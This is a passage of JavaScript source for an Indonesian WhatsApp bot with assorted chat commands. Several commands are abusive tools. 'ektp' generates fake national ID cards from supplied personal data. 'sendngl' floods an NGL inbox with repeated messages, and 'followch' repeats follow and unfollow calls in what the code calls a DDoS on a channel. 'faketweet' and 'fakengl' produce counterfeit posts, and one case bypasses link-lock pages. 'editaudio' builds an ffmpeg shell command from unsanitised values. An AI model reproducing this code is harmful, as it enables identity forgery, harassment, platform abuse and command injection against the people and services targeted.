const nasi = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Hai @${penerima.split('@')[0]}\nAda pesan dari Owner Nihh`}}}
const teksnya = `Pesan dari owner:

*${pesannya}*

Balas menggunakan .chatowner`
await Sky.sendMessage(penerima + "@s.whatsapp.net", {text: teksnya}, {quoted: nasi});
}
break

//=======================================================

case 'modrinth':
case 'mr': {
  if (!args[0]) {
    m.reply(`Silakan berikan slug atau ID proyek Modrinth dan versi game yang ingin dicari.\n\nContoh: .modrinth sodium 1.21.1`)
    break;
  }

  const projectIdOrSlug = args[0];
  const gameVersion = args[1]; // Versi game yang dicari

  if (!gameVersion) {
    m.reply(`Silakan berikan versi game yang ingin dicari.\n\nContoh: .mrdl sodium 1.21.1`)
    break;
  }

  const apiUrl = `https://api.modrinth.com/v2/project/${projectIdOrSlug}/version`;

  m.reply(`Sedang mencari versi yang mendukung ${gameVersion} untuk proyek: ${projectIdOrSlug}...`)

  try {
    axios.get(apiUrl)
      .then(response => {
        const versions = response.data;

        if (!versions || versions.length === 0) {
          m.reply(`Tidak ditemukan versi untuk proyek: ${projectIdOrSlug}.`)
          return;
        }

        const matchingVersions = versions.filter(version => version.game_versions.includes(gameVersion));

        if (matchingVersions.length === 0) {
          m.reply(`Tidak ditemukan versi yang mendukung ${gameVersion} untuk proyek: ${projectIdOrSlug}.`)
          return;
        }

        let message = `Versi yang mendukung ${gameVersion} untuk ${projectIdOrSlug}:\n\n`;
        matchingVersions.forEach((version, index) => {
          message += `*${index + 1}. Nama:* ${version.name}\n`;
          message += `*Versi Game:* ${version.game_versions.join(', ')}\n`;
          message += `*Loader:* ${version.loaders.join(', ')}\n`;
          message += `*ID Versi:* ${version.id}\n`;
          message += `*Tautan Unduhan:* ${version.files.map(file => `[${file.filename}](${file.url})`).join(', ')}\n\n`;
        });
        m.reply(message)
      })
      .catch(error => {
        console.error('Gagal mendapatkan informasi versi proyek:', error);
        m.reply(`Gagal mendapatkan informasi versi untuk proyek: ${projectIdOrSlug}.\n${error.message}`)
      });

  } catch (error) {
    console.error('Terjadi kesalahan saat memproses permintaan Modrinth:', error);
    m.reply(`Terjadi kesalahan saat memproses permintaan Modrinth.`)
  }
  break;
}

//=======================================================
case 'modrinthdl':
case 'mrdl': {
  if (!args[0]) {
    m.reply(`Silakan berikan tautan langsung file Modrinth untuk diunduh.\n\nContoh: .mrfdl https://cdn.modrinth.com/data/AANobbMI/versions/26nVNc41/sodium-fabric-0.6.9%2Bmc1.21.1.jar`)
    break;
  }

  const fileUrl = args[0];

  m.reply(`Sedang mengunduh file dari: ${fileUrl}...`)

  try {
    const response = await axios({
      method: 'get',
      url: fileUrl,
      responseType: 'stream'
    });

    const filenameMatch = fileUrl.match(/\/([^/]+)$/);
    const filename = filenameMatch ? filenameMatch[1] : 'modrinth_file';

    await Sky.sendMessage(m.chat, {
      document: { stream: response.data },
      mimetype: 'application/octet-stream', // MIME type umum untuk file biner
      fileName: filename
    }, { quoted: m });

  } catch (error) {
    console.error('Gagal mengunduh file dari Modrinth:', error);
    m.reply(`Gagal mengunduh file dari tautan yang diberikan.\n${error.message}`)
  }
  break;
}    
    
//=======================================================


case 'link2unlock':
case 'l2u': {
    if (!args[0]) {
        Sky.sendMessage(m.chat, { text: `Silakan berikan tautan Link2Unlock yang ingin diunduh.\n\nContoh: .link2unlock https://link2unlock.com/277e1` }, { quoted: m });
        break;
    }

const puppeteer = require('puppeteer');
    const link2unlockUrl = args[0];

    Sky.sendMessage(m.chat, { text: `Sedang mencoba membuka kunci tautan: ${link2unlockUrl} (menggunakan browser)...` }, { quoted: m });

    let browser;
    try {
        browser = await puppeteer.launch({ headless: 'new' }); // Luncurkan browser headless
        const page = await browser.newPage();
        await page.goto(link2unlockUrl, { waitUntil: 'domcontentloaded' }); // Navigasi ke URL dan tunggu DOMContentLoaded

        // Tunggu elemen yang mungkin berisi tautan unduhan muncul (perlu analisis situs web)
        // Anda mungkin perlu menyesuaikan selektor dan waktu tunggu
        await page.waitForSelector('a[href*="mediafire.com/file/"]', { timeout: 10000 }).catch(() => console.log('Tautan MediaFire tidak ditemukan dalam waktu 10 detik.'));
        await page.waitForSelector('a[href*="drive.google.com/uc?id="]', { timeout: 10000 }).catch(() => console.log('Tautan Google Drive tidak ditemukan dalam waktu 10 detik.'));
        await page.waitForSelector('a[href*="#!"]', { timeout: 10000 }).catch(() => console.log('Tautan Mega tidak ditemukan dalam waktu 10 detik.'));
        await page.waitForSelector('a[href$=".zip"], a[href$=".rar"], a[href$=".mp4"], a[href$=".apk"], a[href$=".exe"]', { timeout: 10000 }).catch(() => console.log('Tautan unduhan langsung tidak ditemukan dalam waktu 10 detik.'));

        // Ekstrak tautan unduhan setelah JavaScript dijalankan
        const downloadLink = await page.evaluate(() => {
            const mediafireLinkElement = document.querySelector('a[href*="mediafire.com/file/"]');
            if (mediafireLinkElement) return mediafireLinkElement.href;

            const googleDriveLinkElement = document.querySelector('a[href*="drive.google.com/uc?id="]');
            if (googleDriveLinkElement) return googleDriveLinkElement.href;

            const megaLinkElement = document.querySelector('a[href*="#!"]');
            if (megaLinkElement) return megaLinkElement.href;

            const directDownloadLinkElement = document.querySelector('a[href$=".zip"], a[href$=".rar"], a[href$=".mp4"], a[href$=".apk"], a[href$=".exe"]');
            if (directDownloadLinkElement) return directDownloadLinkElement.href;

            return null;
        });

        await browser.close();

        if (downloadLink) {
            Sky.sendMessage(m.chat, { text: `Tautan unduhan ditemukan: ${downloadLink}` }, { quoted: m });
            // Anda dapat menambahkan logika untuk mengunduh langsung dari downloadLink di sini
        } else {
            Sky.sendMessage(m.chat, { text: `Tidak dapat menemukan tautan unduhan yang dikenali dari: ${link2unlockUrl} setelah menunggu. Mungkin memerlukan interaksi manual atau struktur situs sangat kompleks.` }, { quoted: m });
        }

    } catch (error) {
        console.error('Gagal membuka kunci tautan Link2Unlock (menggunakan browser):', error);
        if (browser) await browser.close();
        Sky.sendMessage(m.chat, { text: `Gagal membuka kunci tautan yang diberikan (menggunakan browser).\n${error.message}` }, { quoted: m });
    }
    break;
}
    
    

//=======================================================
    case "ektp": {
  try {
    if (!/image/.test(mime)) return m.reply('Kirim Gambar yang akan dijadikan KTP dengan caption perintah!');
    if (!text) return m.reply(`Contoh:\n${prefix + command} JawaBarat/Bandung/3275024509970001/Budi Santoso/Bandung, 25-09-1997/Laki-Laki/A/JL. SUDIRMAN NO. 123/05|08/RAWA BOBO/PASAR MINGGU/ISLAM/BELUM MENIKAH/PEGAWAI SWASTA/WNI/7 Minggu/26-09-1997/25-09-2023`);
    m.reply("Proses Wak...");
    const { ImageUploadService } = require('node-upload-images');
    const fs = require('fs');
    var [ 
      provinsi,
      kota,
      nik,
      nama,
      ttl,
      jenisKelamin,
      golonganDarah,
      alamat,
      rtrw,
      kelDesa,
      kecamatan,
      agama,
      status,
      pekerjaan,
      kewarganegaraan,
      masaBerlaku,
      terbuat
    ] = text.split('/');
    let media = await Sky.downloadAndSaveMediaMessage(m.quoted);
    const service = new ImageUploadService('pixhost.to');
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Rafzbot.jpg');
    const resUrl = `https://fastrestapis.fasturl.cloud/maker/ktp?provinsi=${provinsi}&kota=${kota}&nik=${nik}&nama=${nama}&ttl=${ttl}&jenisKelamin=${jenisKelamin}&golonganDarah=${golonganDarah}&alamat=${alamat}&rtRw=${rtrw}&kelDesa=${kelDesa}&kecamatan=${kecamatan}&agama=${agama}&status=${status}&pekerjaan=${pekerjaan}&kewarganegaraan=${kewarganegaraan}&masaBerlaku=${masaBerlaku}&terbuat=${terbuat}&pasPhoto=${encodeURIComponent(directLink)}`;
    const axios = require('axios');
    const response = await axios.get(resUrl, { responseType: "arraybuffer" });
    Sky.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: mess.done
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Terjadi kesalahan, pastikan format input sudah benar.');
  }
}
break

//=======================================================
    
case 'cektagihanpln': case 'ctagihanpln': case 'tagihanpln': case 'bilpln': {
const axios = require('axios')
const CryptoJS = require('crypto-js')
  if (!text) return m.reply(`Masukkan ID Pelanggan PLN yang ingin dicek\nContoh: ${prefix+command} 123456789012`)

  const plnOnyx = {
    api: {
      base: 'https://pln.onyxgemstone.net',
      endpoint: {
        index: '/indexplnme.php'
      }
    },

    headers: {
      'user-agent': 'Mozilla/5.0 (X11 Ubuntu Linux x86_64 rv:71.0) Gecko/201X0101 Firefox/71.0',
      'connection': 'Keep-Alive'
    },

    isValid: (id) => {
      if (!id) {
        return { valid: false, code: 400, error: 'ID Pelanggannya wajib diisi anjirr lu mau ngecek apaan kalo kosong begitu...' }
      }
      if (!/^\d+$/.test(id)) {
        return { valid: false, code: 400, error: 'Idih, ID Pelanggan apaan kek gini' }
      }
      if (id.length !== 12) {
        return { valid: false, code: 400, error: 'ID Pelanggannya kudu 12 digit yak bree' }
      }
      return { valid: true }
    },

    generateHash: (appidn, id, yyy) => {
      if (!appidn || !id || !yyy) {
        return { valid: false, code: 400, error: 'Parameter hash nya kurang lengkap nih bree' }
      }
      try {
        const c = `${appidn}|rocks|${id}|watu|${yyy}`
        const hash = CryptoJS.MD5(c).toString(CryptoJS.enc.Hex)
        return { valid: true, hash }
      } catch (err) {
        return { valid: false, code: 400, error: 'Error' }
      }
    },

    fmt: (amount) => {
      const num = Number(amount.replace(/\./g, ''))
      return `Rp ${num.toLocaleString('id-ID', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
      }).replace(',', '.')}`
    },

    parse: (data) => {
      if (typeof data === 'string') {
        try {
          const lines = data.split('\n')
          for (const line of lines) {
            if (line.trim().startsWith('{')) {
              return JSON.parse(line)
            }
          }
        } catch (e) {}
      }
      return data
    },

    check: async (id) => {
      const validation = plnOnyx.isValid(id)
      if (!validation.valid) {
        return { success: false, code: validation.code, result: { error: validation.error } }
      }

      const timestamp = Math.floor(Date.now() / 1000)
      const appidn = 'com.tagihan.listrik'
      const yyy = timestamp.toString()
      
      const res = plnOnyx.generateHash(appidn, id, yyy)
      if (!res.valid) {
        return { success: false, code: res.code, result: { error: res.error } }
      }

      try {
        const response = await axios.get(`${plnOnyx.api.base}${plnOnyx.api.endpoint.index}?idp=${id}&appidn=${appidn}&yyy=${yyy}&xxx=${res.hash}`, {
          headers: {
            ...plnOnyx.headers,
            'referer': `${plnOnyx.api.base}${plnOnyx.api.endpoint.index}?idp=${id}&appidn=${appidn}&yyy=${yyy}&xxx=${res.hash}`
          }
        })

        const ps = plnOnyx.parse(response.data)
        if (ps.status === 'error') {
          const ros = ps.pesan || ''
          if (ros.includes('DIBLOKIR')) {
            return {
              success: false,
              code: 403,
              result: {
                error: `Eyaa, ID Pelanggan ${id} diblokir bree. Langsung telpon PLN aja yak bree..`
              }
            }
          }

          if (ros.includes('TAGIHAN SUDAH TERBAYAR')) {
            return {
              success: true,
              code: 200,
              result: {
                status: 'paid',
                message: `Tagihan ID Pelanggan ${id} udah dibayar bree`
              }
            }
          }

          if (ros.includes('id YANG ANDA MASUKKAN SALAH')) {
            return {
              success: false,
              code: 404,
              result: {
                error: `ID Pelanggan ${id} salah bree, keknya bukan nomor ID Pelanggan Listrik Pascabayar dah`
              }
            }
          }
        }

        if (ps.status === 'success' && ps.data) {
          const data = ps.data
          return {
            success: true,
            code: 200,
            result: {
              customer_id: data.id_pelanggan,
              customer_name: data.nama_pelanggan,
              outstanding_balance: plnOnyx.fmt(data.jumlahtagihan),
              billing_period: data.status_periode,
              meter_reading: data.standmeteran,
              power_category: data.status_tarifdaya,
              total_bills: data.status_periode.split(',').length
            }
          }
        }

        return {
          success: false,
          code: 404,
          result: { error: 'Error bree' }
        }

      } catch (err) {
        return {
          success: false,
          code: err.response?.status || 400,
          result: { error: err.message }
        }
      }
    }
  }

  const { success, code, result } = await plnOnyx.check(text)

  if (!success) {
    return m.reply(`${result.error}`)
  }

  if (result.status === 'paid') {
    return m.reply(result.message)
  }

  let output = `*Informasi Tagihan PLN*\n\n`
  output += `ID Pelanggan : ${result.customer_id}\n`
  output += `Nama Pelanggan : ${result.customer_name}\n`
  output += `Daya : ${result.power_category}\n`
  output += `Periode Tagihan : ${result.billing_period}\n`
  output += `Stand Meteran : ${result.meter_reading}\n`
  output += `Total Tagihan : ${result.outstanding_balance}\n`
  output += `Jumlah Tagihan : ${result.total_bills} bulan`

  m.reply(output)
}
break
    

//=======================================================
    
case 'banchat': {
  if (!isOwner && !isAdder) return m.reply('❌ anda tidak memiliki izin!');
  if (!m.isGroup) return m.reply('❌ Hanya bisa di grup!');
  if (!banchat.includes(m.chat)) {
    banchat.push(m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    m.reply('✅ Grup ini telah *dibanned*. Semua command akan diabaikan.');
  } else {
    m.reply('⚠️ Grup ini sudah dibanned. Gunakan .unbanchat untuk membuka.');
  }
}
break

case 'unbanchat': {
if (!isOwner && !isAdder) return m.reply('❌ anda tidak memiliki izin!')
  if (!isOwner) return m.reply('❌ Khusus owner!');
  if (!m.isGroup) return m.reply('❌ Hanya bisa di grup!');
  if (!banchat.includes(m.chat)) {
    m.reply('✅ Grup ini belum diban.');
  } else {
    banchat = banchat.filter(id => id !== m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    m.reply('✅ Grup ini telah *di-unban*. Semua command kembali aktif.');
  }
}
break

case 'listbanchat': {
  if (!isOwner) return m.reply('❌ Khusus owner!');
  if (banchat.length === 0) return m.reply('✅ Tidak ada grup yang dibanned.');
  let teks = `📛 *Daftar Grup yang Dibanned:*\n\n`;
  for (let id of banchat) {
    teks += `• ${id}\n`;
  }
  m.reply(teks);
}
break
    

//=======================================================
 
/*
Fitur play tiktok
Type case
Sumber https://whatsapp.com/channel/0029Vb5owDXKAwEryaIdYk36
*/
case 'playtiktok': case 'playtt': {
  if (!text) return m.reply(`Masukkan query!\nContoh: ${prefix+command} haikyuu edit`);
  Sky.sendMessage(m.chat, { react: { text: "🔎", key: m.key } })
  let res = await fetch(`https://apizell.web.id/download/tiktokplay?q=${encodeURIComponent(text)}`)
  let json = await res.json();
  if (!json.status || !json.data || !json.data.length) return m.reply('Audio tidak ditemukan.');
  let ress = json.data[0];
await Sky.sendMessage(m.chat, {audio: {url: ress.url}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: ress.thumbnail, title: `${ress.title}`, body: `${ress.author}`, sourceUrl: `${ress.url}`, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m});
  Sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
}
break
  
//=======================================================
    
case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await Sky.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break  
    
//=======================================================
    
case 'sendngl': {
  if (!text.includes('|')) return m.reply('Format salah!\nContoh: .sendngl link | pesan | jumlah');
  let [link, pesan, jumlah] = text.split('|').map(v => v.trim());
  jumlah = parseInt(jumlah);
  if (!link.startsWith('https://ngl.link/')) return m.reply('Link NGL tidak valid!');
  if (!pesan) return m.reply('Pesan tidak boleh kosong!');
  if (isNaN(jumlah) || jumlah < 1) return m.reply('Jumlah harus angka lebih dari 0!');
  if (isNaN(jumlah) || jumlah > 100) return m.reply('Jumlah tidak boleh lebih dari 100!');
  let username = link.split('https://ngl.link/')[1];
  if (!username) return m.reply('Username NGL tidak ditemukan di link!');
  const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
  const abiyu = ms => new Promise(resolve => setTimeout(resolve, ms));
  m.reply(`Mengirim pesan ke NGL @${username} sebanyak ${jumlah} kali...`);
  for (let i = 0; i < jumlah; i++) {
    try {
      await fetch('https://ngl.link/api/submit', {
        method: 'POST',
        headers: {
          'accept': '*/*',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        },
        body: `username=${username}&question=${encodeURIComponent(pesan)}&deviceId=1`
      });
      await abiyu(1000); 
    } catch (err) {
      console.log('Nyocot Erorr:', err);
    }
  }
  m.reply(`Selesai mengirim ${jumlah} pesan ke @${username}!\n\nGunakan Dengan Bijak\n> Biyu`);
}
break
    
//=======================================================
    
case 'twitter':case 'tw': case 'x':case 'xdl': case 'twitterdl': case 'twdl':{
  try {
    if (!text) return m.reply(`Contoh: ${prefix + command} linknya`)
    Sky.sendMessage(m.chat, { react: { text: "🔎", key: m.key } })
    async function Twitter(url) {
  try {
    const response = await axios.post('https://twmate.com/', new URLSearchParams({
      page: url,
      ftype: 'all',
      ajax: '1'
    }), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://twmate.com/',
      }
    })
    const $ = cheerio.load(response.data)
    const result = []
    $('.btn-dl').each((index, element) => {
      const quality = $(element).parent().prev().text().trim()  
      const download_url = $(element).attr('href')
      result.push({ quality, download_url })
    })

    return result

  } catch (err) {
    throw Error(err.message)
  }
}
    const res = await Twitter(text)
    const vd = res[0].download_url || res[1].download_url

    await Sky.sendMessage(m.chat, {
      video: { url: vd },
      caption: '',
    }, {
      quoted: m
    })
  } catch (err) {
    console.error(err.message)
    m.reply('Terjadi kesalahan')
  }
}
break 
    
//=======================================================
    
// nih klau fake Tweet nya error☺
case "faketweet": {
  try {
    if (!/image/.test(mime)) return m.reply('Balas gambar yang ingin dijadikan foto profil tweet.');
    if (!text) return m.reply(`*Cara Pakai:*
Balas gambar lalu kirim perintah seperti ini:

${prefix + command} teksTweet/Nama/Username/Waktu/Tanggal/Retweet/Quote/Like/Mode

*Contoh:*
${prefix + command} Alamak😨/Biyu/BiyuBot083/9:36 PM/May 2,2025/155/678/872/dark

*Mode tersedia:* light, dark, dim (huruf kecil semua)`);
    m.reply("Sedang diproses kak :v\n\n> Biyu");
    let [
      content,
      name,
      username,
      time,
      date,
      retweets,
      quotes,
      likes,
      mode
    ] = text.split('/');
    const media = await Sky.downloadAndSaveMediaMessage(m.quoted);
    const { ImageUploadService } = require('node-upload-images');
    const fs = require("fs");
    const axios = require('axios');
    const service = new ImageUploadService("pixhost.to");
    const { directLink } = await service.uploadFromBinary(fs.readFileSync(media), "biyu.jpg");
    const response = await axios.get(`https://fastrestapis.fasturl.cloud/maker/tweet?content=${encodeURIComponent(content)}&ppUrl=${directLink}&name=${encodeURIComponent(name)}&username=${encodeURIComponent(username)}&verified=true&time=${encodeURIComponent(time)}&date=${encodeURIComponent(date)}&retweets=${retweets}&quotes=${quotes}&likes=${likes}&mode=${mode}`, { responseType: "arraybuffer" });
    Sky.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: mess.done
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Terjadi kesalahan saat membuat fake tweet.');
  }
}
break

//=======================================================
    
case 'editaudio': {
    // Dapatkan nama efek dari argumen perintah
    const effectName = text ? text.toLowerCase() : ''; // Ambil argumen setelah .editaudio

    if (!effectName) {
        // Jika tidak ada argumen, tampilkan daftar efek
        let effectList = `Daftar Efek Audio:\n` +
                         `.editaudio bass - Menambah bass\n` +
                         `.editaudio blown - Efek blown out\n` +
                         `.editaudio deep - Memperdalam suara\n` +
                         `.editaudio earrape - Efek earrape\n` +
                         `.editaudio fast - Mempercepat audio\n` +
                         `.editaudio fat - Membuat suara gemuk\n` +
                         `.editaudio nightcore - Efek nightcore\n` +
                         `.editaudio reverse - Memutar balik audio\n` +
                         `.editaudio robot - Efek robot\n` +
                         `.editaudio slow - Memperlambat audio\n` +
                         `.editaudio smooth - Memperhalus audio\n` +
                         `.editaudio squirrel - Efek suara tupai\n\n` +
                         `Balas pesan audio dengan caption perintah di atas untuk menerapkan efek.`;
        m.reply(effectList);
        break; // Penting untuk menghentikan eksekusi
    }

    switch (effectName) {
        case 'bass':
        case 'blown':
        case 'deep':
        case 'earrape':
        case 'fast':
        case 'fat':
        case 'nightcore':
        case 'reverse':
        case 'robot':
        case 'slow':
        case 'smooth':
        case 'squirrel': {
            // Kode efek audio (seperti sebelumnya)
            let set;
            if (effectName === 'bass') set = '-af equalizer=f=54:width_type=o:width=2:g=20';
            if (effectName === 'blown') set = '-af acrusher=.1:1:64:0:log';
            if (effectName === 'deep') set = '-af atempo=4/4,asetrate=44500*2/3';
            if (effectName === 'earrape') set = '-af volume=12';
            if (effectName === 'fast') set = '-filter:a "atempo=1.63,asetrate=44100"';
            if (effectName === 'fat') set = '-filter:a "atempo=1.6,asetrate=22100"';
            if (effectName === 'nightcore') set = '-filter:a atempo=1.06,asetrate=44100*1.25';
            if (effectName === 'reverse') set = '-filter_complex "areverse"';
            if (effectName === 'robot') set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
            if (effectName === 'slow') set = '-filter:a "atempo=0.7,asetrate=44100"';
            if (effectName === 'smooth') set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
            if (effectName === 'squirrel') set = '-filter:a "atempo=0.5,asetrate=65100"';

            try {
                if (qmsg && qmsg.mimetype && qmsg.mimetype.startsWith('audio/')) {
                    await Sky.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

                    // *** ASUMSI: Sky.downloadAndSaveMediaMessage ada di Sky ***
                    const media = await Sky.downloadAndSaveMediaMessage(qmsg);
                    const ran = getRandom('.mp3');

                    await Sky.sendMessage(m.chat, { react: { text: '⚙️', key: m.key } });

                    exec(`ffmpeg -i ${media} ${set} ${ran}`, async (err, stderr, stdout) => {
                        fs.unlinkSync(media);

                        if (err) {
                            console.error(`FFmpeg Error (${effectName}):`, err);
                            await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                            return m.reply(`Terjadi kesalahan saat memproses audio dengan efek *${effectName}*:\n${err}`);
                        }

                        const buff = fs.readFileSync(ran);
                        await Sky.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                        fs.unlinkSync(ran);

                        await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                    });
                } else {
                    await Sky.sendMessage(m.chat, { react: { text: '❓', key: m.key } });
                    m.reply(`Balas pesan audio yang ingin diubah dengan caption *.editaudio ${effectName}*`);
                }
            } catch (e) {
                console.error(`Error (${effectName}):`, e);
                await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                m.reply(`Terjadi kesalahan:\n${e}`);
            }
            break;
        }
        default:
            await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            m.reply(`Efek audio tidak valid. Gunakan *.editaudio <nama_efek>* untuk menggunakan efek audio.`);
            break;
    }
    break;
}
    
//=======================================================
    
case 'aiodl': {
    if (!text) return m.reply('Linknya mana bang?')
    try {
        const axios = require('axios')
        const cheerio = require('cheerio')
        const qs = require('qs')
        async function ttdl(url) {
            const htoken = await axios.get('https://aiovd.com')
            const $ = cheerio.load(htoken.data)
            const token = $('#token').attr('value')
            const data = qs.stringify({ url, token })
            const res = await axios.post('https://aiovd.com/wp-json/aio-dl/video-data', data, {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            })
            return res.data
        }
        let result = await ttdl(text)
        if (!result || !result.medias || result.medias.length === 0) return m.reply('Gagal ambil media.')
        let media = result.medias[0].url
        let filename = `${result.title || 'video'}.mp4`
        await Sky.sendMessage(m.chat, {
            video: { url: media },
            caption: `*Title:* ${result.title}\n*Source:* ${result.source}`
        }, { quoted: m })
    } catch (e) {
        console.log(e)
        m.reply('Gagal download, pastikan link valid dan coba lagi.')
    }
}
    break
    
//=======================================================
    
case 'jadwaltv': {
// Daftar channel TV yang tersedia (PERSIS seperti di foto)
const availableChannels = [
    'antv', 'gtv', 'indosiar', 'inewstv', 'kompastv', 'mdtv', 'metrotv', 'mnctv',
    'moji', 'rcti', 'rtv', 'sctv', 'trans7', 'transtv', 'tvone', 'tvri', 'pay tv',
    'sedang tayang', 'jadwal bola'
];
    if (!text) {
        // Jika tidak ada nama channel, tampilkan daftar channel
        let channelList = "Daftar Channel TV yang Tersedia:\n\n";
        availableChannels.forEach((channel, index) => {
            channelList += `${index + 1}. ${channel.toUpperCase()}\n`;
        });
        channelList += `\nContoh penggunaan: ${prefix}jadwaltv rcti`;
        return m.reply(channelList);
    }

    try {
        const channel = text.toLowerCase();
        if (!availableChannels.includes(channel)) {
            return m.reply(`❌ Channel "${channel}" tidak ditemukan. Gunakan ${prefix}jadwaltv untuk melihat daftar channel yang tersedia.`);
        }

        const url = `https://www.jadwaltv.net/channel/${channel}`;
        const res = await axios.get(url);
        const $ = cheerio.load(res.data);

        let hasil = '';
        $('table tbody tr').each((i, el) => {
            const jam = $(el).find('td').eq(0).text().trim();
            const acara = $(el).find('td').eq(1).text().trim();
            if (jam && acara && jam.toLowerCase() !== 'jam' && acara.toLowerCase() !== 'acara') {
                hasil += `🕒 ${jam} - ${acara}\n`;
            }
        });

        if (!hasil) return m.reply('❌ Channel tidak ditemukan atau tidak ada jadwalnya.');

        m.reply(`📺 *Jadwal ${channel.toUpperCase()} Hari Ini:*\n\n${hasil}`);
    } catch (err) {
        console.error(err);
        m.reply('❌ Gagal mengambil data atau server error.');
    }
    break;
}
    
//=======================================================
    
 case 'followch': {
if (!text) return m.reply(`Contoh Penggunaan\n${prefix+command} abcd@newsletter 999`)
m.reply(`Proses🗿🚬`)
let splitText = text.split(" ").map(t => t.trim());
const targetDDOS = splitText[0];
const jumlahDDOS = splitText[1];
for (let i = 0; i < jumlahDDOS; i++){
await Sky.newsletterFollow(`${targetDDOS}`)
await Sky.newsletterUnfollow(`${targetDDOS}`)
await Sky.newsletterFollow(`${targetDDOS}`)
}
m.reply(`Berhasil menDDOS CH ${targetDDOS} sebanyak ${jumlahDDOS} kali`)
}
break
  

//=======================================================
    
case 'namasaluran': {
if (!text) return m.reply("Mana nama baru sama id saluran nya")
let splitText = text.split("|").map(t => t.trim());
const idsaluran = splitText[0];
const namabaru = splitText[1];
await Sky.newsletterUpdateName(`${idsaluran}`, `${namabaru}`)
}
break

    
//=======================================================
    
case 'fakengl': {
  let [title, ...teks] = args;
  if (!title || teks.length === 0) return m.reply(`Masukkan title dan text!\n\nContoh:\n${prefix + command} Anonymous Chat|haii bang`);

  let textParam = teks.join(' ');
  let api = `https://flowfalcon.dpdns.org/imagecreator/ngl?title=${encodeURIComponent(title)}&text=${encodeURIComponent(textParam)}`;

  try {
    let res = await fetch(api);
    if (!res.ok) return m.reply('Gagal mengambil gambar dari API!');
    let buffer = await res.buffer();

    await Sky.sendMessage(m.chat, {
      image: Buffer.from(buffer), // Gunakan buffer dari fetch
    }, { quoted: m });
  } catch (e) {
    console.error(e);
    Sky.sendMessage(m.chat, { text: 'Terjadi error saat mengambil gambar. Coba lagi nanti.' }, { quoted: m });
  }
}
break;
//=======================================================  

case "mcaddl": {
  if (!isCreator) return Reply(mess.owner)
  // Ambil link dari text
  let link = "https://api.vreden.my.id/api/hentaivid"
  
  // Kirim request ke API untuk mendapatkan video URL
  let response = await fetch(link)
  let data = await response.json()
  
  // Ambil video URL dari response
  let videoUrl = data.data.video_1
  
  // Jika video URL lebih dari satu, kirim semua video
  if (Array.isArray(videoUrl)) {
    for (let i = 0; i < videoUrl.length; i++) {
      let videoData = await getBuffer(videoUrl[i])
      await Sky.sendMessage(m.chat, {video: videoData}, {quoted: m})
    }
  } else {
    // Jika video URL hanya satu, kirim video tersebut
    let videoData = await getBuffer(videoUrl)
    await Sky.sendMessage(m.chat, {video: videoData}, {quoted: m})
  }
}
break
    
//=======================================================
    
case "ytstalk": case "infoyt": case "youtubestalk": {
 if (!text) return m.reply(example("namaChannel"))
 try {
 const apiUrl = `https://fastrestapis.fasturl.cloud/stalk/youtube/simple?username=${encodeURIComponent(text)}`
 const response = await fetch(apiUrl)
 const data = await response.json()
 if (data.status !== 200) {
 return m.reply(`Error: ${data.content || "Failed to fetch data"}`)
 }
 const result = data.result
 const additionalInfo = result.additionalInfo
 let caption = `*🔍 YOUTUBE CHANNEL INFO*\n\n`
 caption += `*Channel:* ${result.channel}\n`
 caption += `*Description:* ${result.description || "No description"}\n`
 caption += `*URL:* ${result.url}\n\n`
 caption += `*📊 STATS*\n`
 caption += `*Subscribers:* ${additionalInfo.totalSubs || "0"}\n`
 caption += `*Total Videos:* ${additionalInfo.totalVideos || "0"}\n`
 caption += `*Total Views:* ${additionalInfo.views || "0"}\n`
 caption += `*Joined:* ${additionalInfo.join || "Unknown"}\n`
 if (result.socialMediaLinks && result.socialMediaLinks.length > 0) {
 caption += `\n*🔗 SOCIAL MEDIA*\n`
 result.socialMediaLinks.forEach((link, index) => {
 caption += `${index + 1}. ${link.url}\n`
 })
 }
 if (result.latestVideos && result.latestVideos.length > 0) {
 caption += `\n*📺 LATEST VIDEOS*\n`
 for (let i = 0; i < Math.min(3, result.latestVideos.length); i++) {
 const video = result.latestVideos[i]
 caption += `${i + 1}. *${video.title}*\n`
 caption += ` Views: ${video.views}\n`
 caption += ` URL: ${video.videoUrl}\n\n`
 }
 }
 await Sky.sendMessage(m.chat, {
 image: { url: result.profile },
 caption: caption
 }, { quoted: m })
 } catch (error) {
 console.log(error)
